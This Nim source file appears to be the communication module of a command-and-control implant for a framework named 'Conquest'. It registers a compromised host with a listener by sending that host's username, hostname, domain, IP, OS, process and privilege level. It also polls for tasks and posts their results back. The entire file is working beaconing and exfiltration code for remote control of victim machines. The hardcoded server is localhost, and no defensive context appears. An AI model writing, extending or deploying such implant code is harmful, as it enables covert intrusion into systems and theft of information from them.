import httpclient, json, strformat, asyncdispatch

import ./[types, agentinfo]

proc register*(listener: string): string = 

    let client = newAsyncHttpClient()

    # Define headers
    client.headers = newHttpHeaders({ "Content-Type": "application/json" })
    
    # Create registration payload
    let body = %*{
        "username": getUsername(),
        "hostname":getHostname(),
        "domain": getDomain(),
        "ip": getIPv4Address(),
        "os": getOSVersion(),
        "process": getProcessExe(),
        "pid":  getProcessId(),
        "elevated": isElevated()
    }
    echo $body

    try:
        # Register agent to the Conquest server
        return waitFor client.postContent(fmt"http://localhost:5555/{listener}/register", $body)
    except HttpRequestError as err:
        echo "Registration failed"
        quit(0)
    finally:
        client.close()

proc getTasks*(listener: string, agent: string): seq[Task] = 

    let client = newAsyncHttpClient()

    try:
        # Register agent to the Conquest server
        let responseBody = waitFor client.getContent(fmt"http://localhost:5555/{listener}/{agent}/tasks")
        return parseJson(responseBody).to(seq[Task])

    except HttpRequestError as err:
        echo "Not found"
        quit(0)

    finally:
        client.close()

    return @[]

proc postResults*(listener, agent: string, task: Task): bool = 
    
    let client = newAsyncHttpClient()

    # Define headers
    client.headers = newHttpHeaders({ "Content-Type": "application/json" })
    
    let taskJson = %task

    try:
        # Register agent to the Conquest server
        discard waitFor client.postContent(fmt"http://localhost:5555/{listener}/{agent}/{task.id}/results", $taskJson)
    except HttpRequestError as err:
        echo "Not found"
        quit(0)
    finally:
        client.close()

    return true